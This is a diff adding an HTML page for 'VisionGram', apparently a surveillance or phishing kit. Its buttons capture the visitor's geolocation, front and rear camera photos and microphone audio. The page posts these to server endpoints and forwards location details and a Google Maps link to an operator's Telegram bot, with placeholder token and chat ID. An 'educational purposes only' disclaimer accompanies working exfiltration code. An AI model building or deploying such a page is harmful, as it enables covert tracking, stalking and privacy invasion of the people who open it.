@@ -1,0 +1,225 @@
+<!--
+       🌎 VisionGram 🌎
+
+       ^ Author    : Cisamu
+       ^ Name      : VisionGram
+       ^ Github    : https://github.com/cisamu123
+       > This program is distributed for educational purposes only.
+-->
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌎 VisionGram 🌎</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+
+        h1 {
+            color: #3498db;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            margin: 10px;
+            cursor: pointer;
+            background-color: #3498db;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #2980b9;
+        }
+
+        footer {
+            margin-top: 20px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <h1>VisionGram</h1>
+
+    <button onclick="getLocation()">Get Location</button>
+    <button onclick="capturePhoto('user')">Capture Front Camera Photo</button>
+    <button onclick="capturePhoto('environment')">Capture Rear Camera Photo</button>
+    <button onclick="startRecording()">Start Recording</button>
+    <button onclick="stopRecording()">Stop Recording</button>
+
+    <footer>
+        Authour: Cisamu <br>
+        GitHub Repository: <a href="https://github.com/cisamu123/VisionGram" target="_blank">https://github.com/cisamu123/VisionGram</a>
+    </footer>
+
+    <script>
+        const botToken = "TELEGRAM_TOKEN_HERE"
+        const chatId = "TELEGRAM_CHAT_ID_HERE"
+        const disclaimer = `
+LEGAL DISCLAIMER PLEASE READ!
+I, the creator (Cisamu) and all those associated with the development and production of this program are not responsible for any actions and or damages caused by this software. You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's intended purpose is NOT to be used maliciously, or on any system that you do not own or have explicit permission to operate and use this program on. By using this software, you automatically agree to the above.
+License: MIT
+`;
+        document.body.innerHTML += disclaimer;
+let mediaRecorder;
+        let audioChunks = [];
+
+        function startRecording() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(function (stream) {
+                    mediaRecorder = new MediaRecorder(stream);
+
+                    mediaRecorder.ondataavailable = function (event) {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = function () {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        const audioURL = URL.createObjectURL(audioBlob);
+                        sendAudio(audioBlob);
+                        audioChunks = [];
+                    };
+
+                    mediaRecorder.start();
+                })
+                .catch(function (error) {
+                    console.error('Error accessing microphone:', error);
+                });
+        }
+
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        }
+
+        function sendAudio(audioBlob) {
+            const formData = new FormData();
+            formData.append('audio', audioBlob, 'audio.wav');
+
+            fetch('/send_audio', {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Audio sent:', data);
+            })
+            .catch(error => {
+                console.error('Error sending audio:', error);
+            });
+        }
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition);
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendMessage(message) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message:', error);
+            });
+        }
+
+        function capturePhoto(camera) {
+            const constraints = {
+                video: { facingMode: camera },
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function (mediaStream) {
+                    const video = document.createElement('video');
+                    video.srcObject = mediaStream;
+                    video.onloadedmetadata = function (e) {
+                        video.play();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Convert the canvas to a Blob
+                        canvas.toBlob(function (blob) {
+                            // Create a FormData object and append the Blob
+                            const formData = new FormData();
+                            formData.append('photo', blob, `${camera}_webcam_photo.png`);
+
+                            // Send the FormData to Telegram
+                            sendPhoto(formData);
+
+                            // Stop the media stream and remove the video element
+                            mediaStream.getTracks().forEach(track => track.stop());
+                            video.remove();
+                        }, 'image/png');
+                    };
+                })
+                .catch(function (err) {
+                    console.error(`Error capturing ${camera} photo:`, err);
+                });
+        }
+
+        function sendPhoto(formData) {
+            fetch('/send_photo', {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Photo sent:', data);
+            })
+            .catch(error => {
+                console.error('Error sending photo:', error);
+            });
+        }
+
+        function sendPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+
+            fetch('/send_location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ latitude: latitude, longitude: longitude }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                sendMessage(data.message + "\nFull Location: " + data.full_location + "\nGoogle Maps URL: " + data.google_maps_url);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
